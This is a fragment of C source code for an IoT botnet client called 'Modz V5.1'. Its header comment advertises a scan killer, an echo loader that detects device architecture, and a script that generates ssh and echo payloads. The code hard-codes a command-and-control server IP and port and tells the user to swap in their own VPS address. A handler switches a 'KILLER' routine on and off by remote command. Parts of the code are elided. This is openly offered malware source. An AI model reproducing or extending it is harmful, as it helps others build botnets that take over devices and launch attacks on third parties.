/*
-----------------------------------------------------
Modz V5.1 BUILD BY SLUMPTHEGOD
New things
ScanKiller and killer have been improved
echo loader now detects the archs of the device
cc.py now gives u your ssh payload and a echo payload
-----------------------------------------------------
ATTACK COMMANDS
-----------------------------------------------------
...
#include "scankill.c"
  ...
  Change 138.197.203.128 to your vps ip!!!!!!

  */

unsigned char *cncip = "138.197.203.128";
int cncport = 1994;
...
/*
  ...
  if (!strcmp(argv[0], "KILLER")) {
    if (!strcmp(argv[1], "OFF")) {
      killer_kill();
      sockprintf(mainCommSock, "\x1b[0;31mKILLER V5.1 STOPPED");
    }
    if (!strcmp(argv[1], "ON")) {
      killer_init();
	  sockprintf(mainCommSock, "\x1b[0;31mKILLER V5.1 STARTED");
    }
	return;
  }
